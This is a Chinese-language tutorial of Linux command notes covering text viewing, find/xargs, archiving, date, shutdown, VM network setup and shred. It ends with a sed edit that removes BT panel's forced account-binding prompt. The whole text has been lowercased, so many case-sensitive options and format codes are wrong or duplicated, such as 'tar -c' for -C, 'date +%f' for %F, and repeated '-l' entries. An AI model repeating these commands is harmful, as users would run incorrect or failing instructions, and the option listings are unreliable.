        将跳格字符显示为 ^i\n-u                       (被忽略)\n-v, --show-nonprinting   使用 ^ 和 m- 引用，除了 lfd 和 tab 之外\n--help     显示此帮助信息并退出\n--version  输出版本信息并退出\n\n如果[文件]缺省，或者[文件]为 - ，则读取标准输入。\n\n\n\n\n# tac命令\n\n> 与cat命令作用相反，反向读取文件内容\n\n\n# 管道符\n\nlinux提供的管道符“|”讲两条命令隔开，管道符左边命令的输出会作为管道符右边命令的输入。\n常见用法：\n#检查python程序是否启动\nps -ef|grep "python"\n\n#找到/tmp目录下所有txt文件\nls /tmp|grep \'.txt\'\n\n#检查nginx的端口是否存活\nnetstat -tunlp |grep nginx\n\n\n\n\n# more命令\n\n> more是一个过滤器, 用于分页显示 (一次一屏) 文本，以当前屏幕窗口尺寸为准\n\n语法\nmore 参数  文件\n\n-num 指定屏幕显示大小为num行\n+num 从num行开始显示\n\n交互式more的命令：\n空格     向下滚动一屏\nenter 向下显示一行\n=            显示当前行号\nq            退出\n\n\n\n\n# less命令\n\n> less命令是more的反义词\n\n\n语法：\nless 参数 文件\n\n-n 显示每行编号\n-e 到文件结尾自动退出，否则得手动输入q退出\n\n子命令\n\n整个的翻页\nb    向前一页\nf 向后一页\n\n空格    查看下一行，等于 ↓\ny            查看上一行，等于↑\n\nq退出\n\n\n\n# head命令\n\n> 用于显示文件内容头部，默认显示开头10行\n\n用法：head [选项]... [文件]...\n将每个指定文件的头10 行显示到标准输出。\n如果指定了多于一个文件，在每一段输出前会给出文件名作为文件头。\n如果不指定文件，或者文件为"-"，则从标准输入读取数据。\n\n  -c,  --bytes=[-]k     显示每个文件的前k 字节内容；\n                        如果附加"-"参数，则除了每个文件的最后k字节数据外\n                        显示剩余全部内容\n  -n, --lines=[-]k      显示每个文件的前k 行内容；\n                        如果附加"-"参数，则除了每个文件的最后k 行外显示\n                        剩余全部内容\n  -q, --quiet, --silent 不显示包含给定文件名的文件头\n  -v, --verbose         总是显示包含给定文件名的文件头\n      --help            显示此帮助信息并退出\n      --version         显示版本信息并退出\n\n\n\n\n# tail命令\n\n> 显示文件内容的末尾，默认输出后10行\n\n-c 数字                            指定显示的字节数\n-n 行数                            显示指定的行数\n-f                                  实时刷新文件变化\n-f 等于 -f --retry                 不断打开文件，与-f合用\n--pid=进程号                 进程结束后自动退出tail命令\n-s 秒数                            检测文件变化的间隔秒数\n\n\n\n\n# cut命令\n\n> cut - 在文件的每一行中提取片断 在每个文件file的各行中, 把提取的片断显示在标准输出。\n\n语法\n\ncut 参数  文件\n\n-b         以字节为单位分割\n-n         取消分割多字节字符，与-b一起用\n-c         以字符为单位\n-d         自定义分隔符，默认以tab为分隔符\n-f         与-d一起使用，指定显示哪个区域\nn       第 n 个 字节, 字符 或 字段, 从 1 计数 起 \nn-       从 第 n 个 字节, 字符 或 字段 直至 行尾 \nn-m     从 第 n 到 第 m (并包括 第m) 个 字节, 字符 或 字段 \n-m       从 第 1 到 第 m (并包括 第m) 个 字节, 字符 或 字段\n\n\n\n# sort命令\n\n> sort命令将输入的文件内容按照规则排序，然后输出结果\n\n用法：sort [选项]... [文件]...\n　或：sort [选项]... --files0-from=f\n串联排序所有指定文件并将结果写到标准输出。\n\n -b, --ignore-leading-blanks   忽略前导的空白区域\n -n, --numeric-sort            根据字符串数值比较\n -r, --reverse                 逆序输出排序结果\n -u, --unique          配合-c，严格校验排序；不配合-c，则只输出一次排序结果\n -t, --field-separator=分隔符  使用指定的分隔符代替非空格到空格的转换\n -k, --key=位置1[,位置2]       在位置1 开始一个key，在位置2 终止(默认为行尾)\n\n\n\n# uniq命令\n\n> uniq命令可以输出或者忽略文件中的重复行，常与sort排序结合使用\n\n用法：uniq [选项]... [文件]\n从输入文件或者标准输入中筛选相邻的匹配行并写入到输出文件或标准输出。\n\n不附加任何选项时匹配行将在首次出现处被合并。\n\n-c, --count           在每行前加上表示相应行目出现次数的前缀编号\n-d, --repeated        只输出重复的行\n-u, --unique          只显示出现过一次的行,注意了，uniq的只出现过一次，是针对-c统计之后的结果\n\n\n\n# wc命令\n\n> wc命令用于统计文件的行数、单词、字节数\n\n-c, --bytes打印字节数\n-m, --chars  打印字符数 \n-l, --lines  打印行数 \n-l, --max-line-length  打印最长行的长度\n-w, --words 打印单词数\n\n\n\n# tr命令\n\n> tr命令从标准输入中替换、缩减或删除字符，将结果写入到标准输出\n\n用法：tr [选项]... set1 [set2]\n从标准输入中替换、缩减和/或删除字符，并将结果写到标准输出。\n\n字符集1：指定要转换或删除的原字符集。\n\n当执行转换操作时，必须使用参数“字符集2”指定转换的目标字符集。\n\n但执行删除操作时，不需要参数“字符集2”；\n\n字符集2：指定要转换成的目标字符集。\n\n-c或——complerment：取代所有不属于第一字符集的字符；\n-d或——delete：删除所有属于第一字符集的字符；\n-s或--squeeze-repeats：把连续重复的字符以单独一个字符表示；\n-t或--truncate-set1：先删除第一字符集较第二字符集多出的字符。\n\n\n\n# stat命令\n\n> stat命令用于显示文件的状态信息。stat命令的输出信息比ls命令的输出信息要更详细。\n\n * stat(选项)(参数)\n\n# 选项\n\n -l, --dereference     跟随链接\n  -f, --file-system     显示文件系统状态而非文件状态\n  -c --format=格式      使用指定输出格式代替默认值，每用一次指定格式换一新行\n      --printf=格式     类似 --format，但是会解释反斜杠转义符，不使用换行作\n                                输出结尾。如果您仍希望使用换行，可以在格式中\n                                加入"\\n"\n  -t, --terse           使用简洁格式输出\n      --help            显示此帮助信息并退出\n      --version         显示版本信息并退出\n\n 有效的文件格式序列(不使用 --file-system)：\n  %a    八进制权限\n\n\n# 参数\n\n> 文件：指定要显示信息的普通文件或者文件系统对应的设备文件名。\n\n[root@www ~]#stat abc.ph\n  文件："abc.ph"\n  大小：0               块：0          io 块：4096   普通空文件\n设备：801h/2049d        inode：1200314     硬链接：1\n权限：(0644/-rw-r--r--)  uid：(    0/    root)   gid：(    0/    root)\n最近访问：2013-05-14 13:24:30.830729223 +0800\n最近更改：2013-05-14 13:24:30.830729223 +0800\n最近改动：2013-05-14 13:24:30.830729223 +0800\n创建时间：-\n\n[root@luffycity tmp]# stat test.txt\n  file: \'test.txt\'\n  size: 16            blocks: 8          io block: 4096   regular file\ndevice: fd00h/64768d    inode: 17540200    links: 1\naccess: (0644/-rw-r--r--)  uid: (    0/    root)   gid: (    0/    root)\ncontext: unconfined_u:object_r:user_tmp_t:s0\naccess: 2019-10-18 14:58:59.465647961 +0800\nmodify: 2019-10-18 14:58:57.799636638 +0800\nchange: 2019-10-18 14:58:57.799636638 +0800\n birth: -\n\n#显示文件权限\n[root@pylinux test_find]# stat -c  %a alex.txt\n644\n\n\n\n# stat的时间戳\n\naccess: 2019-10-18 14:58:59.465647961 +0800\nmodify: 2019-10-18 14:58:57.799636638 +0800\nchange: 2019-10-18 14:58:57.799636638 +0800\n\naccess、最近访问，文件每次被cat之后，时间变化，由于操作系统特性，做了优化，频繁访问，时间不变\nmodify，最近更改，更改文件内容，vim等\nchange，最近改动，文件元数据改变，如文件名\n\n\n\n\n# find命令\n\n> find命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。 如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。 并且将查找到的子目录和文件全部进行显示。\n\nfind 查找目录和文件，语法：\n\nfind 路径 -命令参数 [输出形式]\n\n参数说明：\n路径：告诉find在哪儿去找你要的东西，\n\n\n参数                解释\n-pathname         要查找的路径\n# options选项       \n-maxdepth         <目录层级>：设置最大目录层级；\n-mindepth         <目录层级>：设置最小目录层级；\n# tests模块         \n-atime            按照文件访问access的时间查找，单位是天\n-ctime            按照文件的改变change状态来查找文件，单位是天\n-mtime            根据文件修改modify时间查找文件【最常用】\n-name             按照文件名字查找，支持* ? [] 通配符\n-group            按照文件的所属组查找\n-perm             按照文件的权限查找\n-size n[cwbkmg]   按照文件的大小 为 n 个由后缀决定的数据块。其中后缀为：\n                  b: 代表 512 位元组的区块（如果用户没有指定后缀，则默认为 b）\n                  c: 表示字节数\n                  k: 表示 kilo bytes （1024字节）\n                  w: 字 （2字节）\n                  m:兆字节（1048576字节）\n                  g: 千兆字节 （1073741824字节）\n-type 查找某一类型的文件   b - 块设备文件。\n                  d - 目录。\n                  c - 字符设备文件。\n                  p - 管道文件。\n                  l - 符号链接文件。\n                  f - 普通文件。\n                  s -\n-user             按照文件属主来查找文件。\n-path             配合-prune参数排除指定目录\nactions模块         \n-prune            使find命令不在指定的目录寻找\n-delete           删除找出的文件\n-exec 或-ok        对匹配的文件执行相应shell命令\n-print            将匹配的结果标准输出\noperators         \n! 取反              \n-a -o             取交集、并集，作用类似&&和\\\n\n> unix/linux文件系统每个文件都有三种时间戳：\n\n * 访问时间（-atime/天，-amin/分钟）：用户最近一次访问时间（文件修改了，还未被读取过，则不变）。\n * 修改时间（-mtime/天，-mmin/分钟）：文件最后一次修改时间（数据变动）。\n * 变化时间（-ctime/天，-cmin/分钟）：文件数据元（例如权限等）最后一次修改时间。\n * 文件任何数据改变，change变化，无论是元数据变动，或是对文件mv，cp等\n * 文件内容被修改时，modify和change更新\n * 当change更新后，第一次访问该文件（cat，less等），access time首次会更新，之后则不会\n\n# find根据修改时间查找文件\n\n#一天以内，被访问access过的文件\nfind . -atime -1  \n\n#一天以内，内容变化的文件\nfind . -mtime -1 \n\n#恰好在7天内被访问过的文件\n[root@pylinux home]# find /  -maxdepth 3  -type f -atime 7\n\n\n时间说明\n\n * -atime -2 搜索在2天内被访问过的文件\n * -atime 2 搜索恰好在2天前被访问过的文件\n * -atime +2 超过2天内被访问的文件\n\n# find反向查找\n\n[root@pylinux opt]# find . -maxdepth 1  -type d      #在opt目录下 查找最大目录深度为1 文件夹类型的数据\n\n[root@pylinux opt]# find . -maxdepth 1  ! -type d    # 加上感叹号，后面接条件，代表取除了文件夹以外类型\n\n\n\n# 根据权限查找\n\n[root@pylinux opt]# find . -maxdepth 2  -perm 755 -type f  #寻找权限类型是755的文件\n\n\n\n# 按照文件大小查\n\n[root@pylinux opt]# du -h `find . -maxdepth 2 -size +10m`        #找出超过10m大小的文件\n14m    ./python-3.7.3/python\n24m    ./python-3.7.3/libpython3.7m.a\n322m    ./s21-centos-vim.tar.gz\n\n\n# 查找文件时忽略目录\n\n[root@pylinux s18tngx]# find . -path "./conf.d" -prune -o -name "*.conf" -print\n\n\n\n# 根据用户组匹配\n\n[root@pylinux home]# find / -maxdepth 3 -group yu        #全局搜索深度为3，用户组是yu的文件\n/home/yu\n/home/yu/.bashrc\n/home/yu/.bash_profile\n/home/yu/.bash_history\n/home/yu/.cache\n/home/yu/.bash_logout\n/home/yu/.config\n\n\n\n# 使用-exec或是-ok再次处理\n\n> -ok比-exec更安全，存在用户提示确认\n\n#找出以.txt结尾的文件后执行删除动作且确认\n[root@pylinux opt]# find /opt/luffy_boy  -type f -name "*.txt" -ok  rm  {}  \\;\n\n备注\n-exec 跟着shell命令，结尾必须以;分号结束，考虑系统差异，加上转义符\\;\n{}作用是替代find查阅到的结果\n{}前后得有空格\n#找到目录中所有的.txt文件，且将查询结果写入到all.txt文件中\n[root@pylinux opt]# find ./mydj2/ -type f -name "*.txt" -exec cat {} \\; > all.txt\n#把30天以前的日志，移动到old文件夹中\nfind . -type f -mtime +30 -name "*.log" -exec cp {} old \\;\n\n\n\n\n# xargs命令\n\n> xargs 又称管道命令，构造参数等。 是给命令传递参数的一个过滤器,也是组合多个命令的一个工具它把一个数据流分割为一些足够小的块,以方便过滤器和命令进行处理 。 简单的说就是把其他命令的给它的数据，传递给它后面的命令作为参数\n\n-d 为输入指定一个定制的分割符，默认分隔符是空格\n-i 用 {} 代替 传递的数据\n-i string 用string来代替传递的数据-n[数字] 设置每次传递几行数据\n-n 选项限制单个命令行的参数个数\n-t 显示执行详情\n-p 交互模式\n-p n 允许的最大线程数量为n\n-s[大小] 设置传递参数的最大字节数(小于131072字节)\n-x 大于 -s 设置的最大长度结束 xargs命令执行\n-0，--null项用null分隔，而不是空白，禁用引号和反斜杠处理\n\n\n\n案例\n\n多行输入变单行\n\n[root@luffycity tmp]# cat mjj.txt\n1 2 3 4\n5 6 7 8\n9 10\n[root@luffycity tmp]# xargs < mjj.txt\n1 2 3 4 5 6 7 8 9 10\n-n参数限制每行输出个数\n\n[root@luffycity tmp]# xargs -n 3 < mjj.txt        #每行最多输出3个\n1 2 3\n4 5 6\n7 8 9\n10\n自定义分隔符-d参数\n\n[root@luffycity tmp]# echo "alex,alex,alex,alex,alex," |xargs -d ","\nalex alex alex alex alex\n\n#定义分隔符后，限制每行参数个数\n[root@luffycity tmp]# echo "alex,alex,alex,alex,alex," |xargs -d "," -n 2\nalex alex\nalex alex\nalex\n-i参数的用法，用{}替换传递的数据\n\n-i 参数用法，用string代替数据\n\n#找到当前目录所有的.txt文件，然后拷贝到其他目录下\n[root@luffycity tmp]# find . -name "*.txt" |xargs -i  cp {} heihei/\n\n[root@luffycity tmp]# find . -name "*.txt" |xargs -i data cp data  heihei/\n\n#找到当前目录下所有txt文件，然后删除\n[root@luffycity tmp]# find . -name "*.txt" |xargs -i rm -rf {}\n重点\n\nxargs识别字符串的标识是空格或是换行符，因此如果遇见文件名有空格或是换行符，xargs就会识别为两个字符串，就会报错\n\n-print0在find中表示每一个结果之后加一个null字符，而不是换行符（find默认在结果后加上\\n，因此结果是换行输出的）\nxargs -0 表示xargs用null作为分隔符\n\n\n#修改find的输出结果，-print0可以改结尾为null\n[root@luffycity tmp]# find . -name "*.txt" -print\n./hello luffycity.txt\n[root@luffycity tmp]# find . -name "*.txt" -print0\n./hello luffycity.txt[root@luffycity tmp]#\n\n\n#修改xargs，理解默认分隔符是null\nfind . -name "*.txt" -print0 |xargs -0 rm\n\n\n\n\n# file命令\n\n> 显示文件的类型\n\n[root@luffycity tmp]# file /usr/bin/python2.7        #二进制解释器类型\n/usr/bin/python2.7: elf 64-bit lsb executable\n\n[root@luffycity tmp]# file /usr/bin/yum                    #yum是python的脚本文件\n/usr/bin/yum: python script, ascii text executable\n\n[root@luffycity tmp]# file /usr/bin/cd                #shell脚本，内置命令\n/usr/bin/cd: posix shell script, ascii text executable\n\n[root@luffycity tmp]# file hehe.txt            #text类型\nhehe.txt: ascii text\n\n[root@luffycity tmp]# file heihei            #文件夹\nheihei: directory\n\n[root@luffycity tmp]# file /usr/bin/python2            #软链接类型\n/usr/bin/python2: symbolic link to `python2.7\'\n\n\n\n\n# which\n\n> 查找path环境变量中的文件，linux内置命令不在path中\n\n[root@luffycity tmp]# which python\n/usr/bin/python\n\n\n\n# whereis命令\n\n> whereis命令用来定位指令的二进制程序、源代码文件和man手册页等相关文件的路径。\n\n[root@luffycity tmp]# whereis python\npython: /usr/bin/python /usr/bin/python2.7 /usr/lib/python2.7 /usr/lib64/python2.7 /etc/python /usr/include/python2.7 /usr/share/man/man1/python.1.gz\n\n\n\n\n# tar命令\n\n> tar命令在linux系统里，可以实现对多个文件进行，压缩、打包、解包\n\n打包\n\n将一大堆文件或目录汇总成一个整体。\n\n压缩\n\n将大文件压缩成小文件，节省磁盘空间。\n\n\n\n语法：\ntar(选项)(参数)\n\n-a或--catenate：新增文件到以存在的备份文件；\n-b：设置区块大小；\n-c或--create：建立新的备份文件；\n-c <目录>：这个选项用在解压缩，若要在特定目录解压缩，可以使用这个选项。\n-d：记录文件的差别；\n-x或--extract或--get：从备份文件中还原文件；\n-t或--list：列出备份文件的内容；\n-z或--gzip或--ungzip：通过gzip指令处理备份文件；\n-z或--compress或--uncompress：通过compress指令处理备份文件；\n-f<备份文件>或--file=<备份文件>：指定备份文件；\n-v或--verbose：显示指令执行过程；\n-r：添加文件到已经压缩的文件；\n-u：添加改变了和现有的文件到已经存在的压缩文件；\n-j：支持bzip2解压文件；\n-v：显示操作过程；\n-l：文件系统边界设置；\n-k：保留原有文件不覆盖；\n-m：保留文件不被覆盖；\n-w：确认压缩文件的正确性；\n-p或--same-permissions：用原来的文件权限还原文件；\n-p或--absolute-names：文件名使用绝对名称，不移除文件名称前的“/”号；不建议使用\n-n <日期格式> 或 --newer=<日期时间>：只将较指定日期更新的文件保存到备份文件里；\n--exclude=<范本样式>：排除符合范本样式的文件。\n-h, --dereference跟踪符号链接；将它们所指向的文件归档并输出\n案例\n\n仅打包，不压缩\n\n#tar 参数 包裹文件名  需要打包的文件\n[alex@luffycity tmp]$ tar -cvf alltmp.tar ./*\n打包后且用gzip命令压缩，节省磁盘空间\n\n[alex@luffycity tmp]$ tar -zcvf alltmp.tar ./*\n注意\n\nf参数必须写在最后，后面紧跟压缩文件名\ntar命令仅打包，习惯用.tar作为后缀\ntar命令加上z参数，文件以.tar.gz或.tgz表示\n列出tar包内的文件\n\n#根据tar包文件后缀，决定是否添加z参数，调用gzip\n[alex@luffycity tmp]$ tar -ztvf alltmp2.tar.gz\n拆开tar包\n\n[root@luffycity tmp]# tar -xf alltmp.tar\n拆开tar的压缩包\n\ntar -zxvf ../alltmp2.tar.gz ./\n拆除tar包中部分文件\n\n#正常解压命令，单独加上你要拆除的文件名，指定路径\n#先看下tar包中有什么内容，再指定文件解压\n\n[root@luffycity tmp]# tar -ztvf ../alltmp2.tar.gz\n\n[root@luffycity tmp]# tar -zxvf ../alltmp2.tar.gz ./alltmp.tar\n./alltmp.tar\n指定目录解tar包\n\n[root@luffycity tmp]# tar -xf alltmp.tar -c /opt/data/\n排除文件解包\n\n#注意--exclude 跟着文件名或是文件夹，不得加斜杠，排除多个文件，就写多个--exclude\n[root@luffycity tmp]# tar -zxvf ../alltmp2.tar.gz   --exclude data\n打包链接文件\n\n-h参数能够保证，打包的不仅仅是个快捷方式，而是找到源文件\n\n\n打包/etc下所有普通文件\n\n[root@luffycity tmp]# tar -zcvf etc.tgz `find /etc -type f`\n[root@luffycity tmp]# tar -tzvf etc.tgz\n\n\n\n# gzip命令\n\n> 要说tar命令是个纸箱子用于打包，gzip命令就是压缩机器 gzip通过压缩算法lempel-ziv 算法(lz77) 将文件压缩为较小文件，节省60%以上的存储空间，以及网络传输速率\n\ngzip(选项)(参数)\n\n-a或——ascii：使用ascii文字模式；\n-c或--stdout或--to-stdout 　把解压后的文件输出到标准输出设备。 \n-d或--decompress或----uncompress：解开压缩文件；\n-f或——force：强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接；\n-h或——help：在线帮助；\n-l或——list：列出压缩文件的相关信息；\n-l或——license：显示版本与版权信息；\n-n或--no-name：压缩文件时，不保存原来的文件名称及时间戳记；\n-n或——name：压缩文件时，保存原来的文件名称及时间戳记；\n-q或——quiet：不显示警告信息；\n-r或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理；\n-s或<压缩字尾字符串>或----suffix<压缩字尾字符串>：更改压缩字尾字符串；\n-t或——test：测试压缩文件是否正确无误；\n-v或——verbose：显示指令执行过程；\n-v或——version：显示版本信息；\n-<压缩效率>：压缩效率是一个介于1~9的数值，预设值为“6”，指定愈大的数值，压缩效率就会愈高；\n--best：此参数的效果和指定“-9”参数相同；\n--fast：此参数的效果和指定“-1”参数相同。\n案例\n\n#压缩目录中每一个html文件为.gz,文件夹无法压缩，必须先tar打包\ngzip *.html        #gzip压缩，解压都会删除源文件\n列出压缩文件中信息\n\n[root@luffycity tmp]# gzip -l *.gz        #不解压显示压缩文件内信息，以及压缩率\n         compressed        uncompressed  ratio uncompressed_name\n                 28                   0   0.0% 10.html\n                 24                   0   0.0% 123\n                 27                   0   0.0% 1.html\n                 27                   0   0.0% 2.html\n                 27                   0   0.0% 3.html\n                 27                   0   0.0% 4.html\n                 27                   0   0.0% 5.html\n                 27                   0   0.0% 6.html\n                 27                   0   0.0% 7.html\n                 27                   0   0.0% 8.html\n                 27                   0   0.0% 9.html\n           23581672           118888884  80.2% alex.txt\n           23582535           118896640  80.2% alltmp.tar\n                289                 470  44.9% glances.log\n                 45                  16 -12.5% hehe.txt\n           47164836           237786010  80.2% (totals)\n解压缩且显示过程\n\n[root@luffycity tmp]# gzip -dv *.gz\n10.html.gz:      0.0% -- replaced with 10.html\n123.gz:      0.0% -- replaced with 123\n1.html.gz:      0.0% -- replaced with 1.html\n2.html.gz:      0.0% -- replaced with 2.html\n3.html.gz:      0.0% -- replaced with 3.html\n4.html.gz:      0.0% -- replaced with 4.html\n5.html.gz:      0.0% -- replaced with 5.html\n6.html.gz:      0.0% -- replaced with 6.html\n7.html.gz:      0.0% -- replaced with 7.html\n8.html.gz:      0.0% -- replaced with 8.html\n9.html.gz:      0.0% -- replaced with 9.html\nalex.txt.gz:     80.2% -- replaced with alex.txt\nalltmp.tar.gz:     80.2% -- replaced with alltmp.tar\nglances.log.gz:     44.9% -- replaced with glances.log\nhehe.txt.gz:    -12.5% -- replaced with hehe.txt\n压缩保留源文件\n\n#-c参数\n[root@luffycity tmp]# gzip -c  alltmp.tar > alltmp.tar.gz\ngzip套件提供了许多方便的工具命令，可以直接操作压缩文件内容\n\nzcat，直接读取压缩文件内容zcat hehe.txt.gz\nzgrep\nzless\nzdiff\n\n\n\n\n# zip命令\n\n> zip 命令：是一个应用广泛的跨平台的压缩工具，压缩文件的后缀为 zip文件，还可以压缩文件夹\n\n\n语法：\nzip 压缩文件名  要压缩的内容\n\n-a 自动解压文件\n-c 给压缩文件加注释\n-d 删除文件\n-f 修复损坏文件\n-k 兼容 dos\n-m 压缩完毕后，删除源文件\n-q 运行时不显示信息处理信息\n-r 处理指定目录和指定目录下的使用子目录\n-v 显示信息的处理信息\n-x “文件列表” 压缩时排除文件列表中指定的文件\n-y 保留符号链接\n-b<目录> 指定压缩到的目录\n-i<格式> 匹配格式进行压缩\n-l 显示版权信息\n-t<日期> 指定压缩文件的日期\n-<压缩率> 指定压缩率\n最后更新 2018-03-08 19:33:4\n案例\n\n#压缩当前目录下所有内容为alltmp.zip文件\n[root@luffycity tmp]# zip alltmp.zip ./*\n\n#压缩多个文件夹\n[root@luffycity tmp]# zip -r data.zip ./data ./data2\nunzip命令用于解压\n\n参数\n\n-l：显示压缩文件内所包含的文件；\n-d<目录> 指定文件解压缩后所要存储的目录。\n案例\n\n#查看压缩文件内容\n[root@luffycity tmp]# unzip -l data.zip\n\n#解压缩zip文件\n[root@luffycity tmp]# unzip data.zip\n\n\n\n# date命令\n\n> date命令用于显示当前系统时间，或者修改系统时间\n\n语法\n\ndate  参数   时间格式\n\n参数\n\n-d, --date=string\n    显示由 string 指定的时间, 而不是当前时间 \n\n-s, --set=string\n    根据 string 设置时间 \n\n-u, --utc, --universal\n    显示或设置全球时间(格林威治时间)\n时间格式\n\n%%\n    文本的 % \n%a\n    当前区域的星期几的简写 (sun..sat) \n%a\n    当前区域的星期几的全称 (不同长度) (sunday..saturday) \n%b\n    当前区域的月份的简写 (jan..dec) \n%b\n    当前区域的月份的全称(变长) (january..december) \n%c\n    当前区域的日期和时间 (sat nov 04 12:02:33 est 1989) \n%d\n    (月份中的)几号(用两位表示) (01..31) \n%d\n    日期(按照 月/日期/年 格式显示) (mm/dd/yy) \n%e\n    (月份中的)几号(去零表示) ( 1..31) \n%h\n    同 %b \n%h\n    小时(按 24 小时制显示，用两位表示) (00..23) \n%i\n    小时(按 12 小时制显示，用两位表示) (01..12) \n%j\n    (一年中的)第几天(用三位表示) (001..366) \n%k\n    小时(按 24 小时制显示，去零显示) ( 0..23) \n%l\n    小时(按 12 小时制显示，去零表示) ( 1..12) \n%m\n    月份(用两位表示) (01..12) \n%m\n    分钟数(用两位表示) (00..59) \n%n\n    换行 \n%p\n    当前时间是上午 am 还是下午 pm \n%r\n    时间,按 12 小时制显示 (hh:mm:ss [a/p]m) \n%s\n    从 1970年1月1日0点0分0秒到现在历经的秒数 (gnu扩充) \n%s\n    秒数(用两位表示)(00..60) \n%t\n    水平方向的 tab 制表符 \n%t\n    时间,按 24 小时制显示(hh:mm:ss) \n%u\n    (一年中的)第几个星期，以星期天作为一周的开始(用两位表示) (00..53) \n%v\n    (一年中的)第几个星期，以星期一作为一周的开始(用两位表示) (01..52) \n%w\n    用数字表示星期几 (0..6); 0 代表星期天 \n%w\n    (一年中的)第几个星期，以星期一作为一周的开始(用两位表示) (00..53) \n%x\n    按照 (mm/dd/yy) 格式显示当前日期 \n%x\n    按照 (%h:%m:%s) 格式显示当前时间 \n%y\n    年的后两位数字 (00..99) \n%y\n    年(用 4 位表示) (1970...) \n%z\n    按照 rfc-822 中指定的数字时区显示(如, -0500) (为非标准扩充) \n%z\n    时区(例如, edt (美国东部时区)), 如果不能决定是哪个时区则为空 \n\n默认情况下,用 0 填充数据的空缺部分. gnu 的 date 命令能分辨在 `%\'和数字指示之间的以下修改.\n\n    `-\' (连接号) 不进行填充 `_\' (下划线) 用空格进行填充\n案例\n\n显示当前系统部分时间\n\n1.显示短年份\ndate +%y\n\n2.显示长年份\ndate +%y\n\n3.显示月份\ndate +%m\n\n4.显示几号\ndate +%d\n\n5.显示几时\ndate +%h\n\n6.显示几分\ndate +%m\n\n7.显示整秒\ndate +%s\n\n8.显示时间如，年-月-日\ndate +%f\n\n9.显示时间如，时：分：秒\ndate +%t\n-d参数指定时间显示，仅仅是显示\n\n1.显示昨天\n date +%f -d "-1day"\n\n2.显示昨天\ndate +%f -d "yesterday"\n\n3.显示前天\ndate +%f -d "-2day"\n\n4.显示明天日期\ndate +%f -d "+1day"\n\n5.显示明天，英文表示\ndate +%f -d "tomorrow"\n\n6.显示一个月之前，之后\n[root@pylinux /]# date +%f -d "1month"\n2019-12-01\n[root@pylinux /]# date +%f -d "-1month"\n2019-10-01\n\n7.显示一年后\ndate +%f -d "1year"\n\n8.显示60分钟后\ndate +%t -d "60min"\n\n\n+表示未来\n-表示过去\nday表示日\nmonth表示月份\nyear表示年\nmin表示分钟\n-s设置时间\n\n设置时间较少，一般配置ntp时间服务器\n\n1.设置时间\n[root@pylinux /]# date -s "20170808"\n2017年 08月 08日 星期二 00:00:00 cst\n[root@pylinux /]#\n[root@pylinux /]# date\n2017年 08月 08日 星期二 00:00:00 cst\n\n\n\n2.修改分钟\n[root@pylinux /]# date -s "05:06:33"\n2017年 08月 08日 星期二 05:06:33 cst\n[root@pylinux /]# date\n2017年 08月 08日 星期二 05:06:33 cst\n\n\n3.修改日期和分钟\n[root@pylinux /]# date -s "20180606 05:30:30"\n2018年 06月 06日 星期三 05:30:30 cst\n[root@pylinux /]# date\n2018年 06月 06日 星期三 05:30:31 cst\n\n4.可设置不同格式的时间\ndate -s "2018-06-06 05:30:30"\ndate -s "2018/07/07 05:30:30"\n\n\n# linux开关机命令\n\n命令                说明\nshutdown -h now   立刻关机，企业用法\nshutdown -h 1     1分钟后关机，也可以写时间如 11:30\nhalt              立刻关闭系统，需手工切断电源\ninit 0            切换运行级别为0，0表示关机\npoweroff          立刻关闭系统，且关闭电源\n重启                \nreboot            立刻重启机器，企业用法\nshutdown -r now   立刻重启，企业用法\nshutdown -r 1     一分钟后重启\ninit 6            切换运行级别为6，此级别是重启\n注销命令              \nlogout            注销退出当前用户\nexit              注销退出当前用户，快捷键ctrl + d\n\n# linux命令行常用快捷键\n\nctrl + c     cancel取消当前操作\nctrl + l    清空屏幕内容\nctrl + d    退出当前用户\nctrl + a     光标移到行首\nctrl + e    光标移到行尾\nctrl + u  删除光标到行首的内容\n\n\n\n\n# 虚拟机的ip配置\n\nvmnet8 更改\n虚拟机->编辑->更改设置->nat模式打勾-> 将主机虚拟适配器连接到此网路\n\n创建虚拟的网卡ip\n子网ip 192.168.178.0 子网掩码255.255.255.0\n\n-> nat 设置 网关ip 常用为192.168.178.254\n\n\n查看ip \nip addr show\n\nvi /etc/sysconfig/network-scripts/ifcfg-ens33\n\ni为编写\n\n修改为\n\n\ntype="ethernet"\nproxy_method="none"\nbrowser_only="no"\nbootproto="static"    --静态\ndefroute="yes"\nipv4_failure_fatal="no"\nipv6init="yes"\nipv6_autoconf="yes"\nipv6_defroute="yes"\nipv6_failure_fatal="no"\nipv6_addr_gen_mode="stable-privacy"\nname="ens33"\nuuid="7264e0dc-167c-4f01-b12b-40365a63c45d"\ndevice="ens33"\nonboot="yes"   --设置自动开启\nipaddr=192.168.178.110  --设置统一网段的开启\nnetmask=255.255.255.0 --网编码\ngateway=192.168.178.254  --网关\ndns1=119.29.29.29  dns1 腾讯的\n\n\n按键esc 取消\n输入 :wq! 保存当前编写\n\nsystemctl stop networkmanager 停止有线服务\nsystemctl restart network\n重启有线服务\n\n按下clat+alt -f1-f7 //切换终端\n\npasswd  //修改root密码\n\n\nssh root@192.168.11.45  //登录\nssh 登录的用户名@主机名\n\n\n\n# shred命令\n\n用法：shred [选项]... 文件...\n\n多次覆盖文件，使得即使是昂贵的硬件探测仪器也难以将数据复原。\n\n-u, --remove 覆盖后截断并删除文件\nshred heihei.txt  随机覆盖文件内容，不删除源文件\n\n\n案例\n\n彻底粉碎且删除文件\n\n[root@pylinux tmp]# ls -lh\n总用量 25m\n-rw-r--r-- 1 root root 25m 10月 14 15:02 heihei.txt\n[root@pylinux tmp]#\n[root@pylinux tmp]# shred -u heihei.txt\n\n\n\n508 0.9\n\n\n# 修改宝塔面板的登录提示\n\n> 先安装宝塔，如果登陆啥事都没有那最好，如果提示必须要登陆宝塔账户。 那么，在terminal里执行：\n\n * bt default\n\nsed -i "s|if (bind_user == \'true\') {|if (bind_user == \'removed\') {|g" /www/server/panel/btpanel/static/js/index.js\n全选代码复制\n完工。\n\n\n同理，如果要还原\n\nsed -i "s|if (bind_user == \'removed\') {|if (bind_user == \'true\') {|g" /www/server/panel/btpanel/static/js/index.js\n全选代码复制\n手动修改\n\n\n/www/server/panel/btpanel/static/js/index.js\n\n找到这个文件，搜索\n\nbind_user\n\n把\n\nif (bind_user == \'true\') {\nshow_force_bind();\n}\n全选代码复制\n改成\n\nif (bind_user == \'removed\') 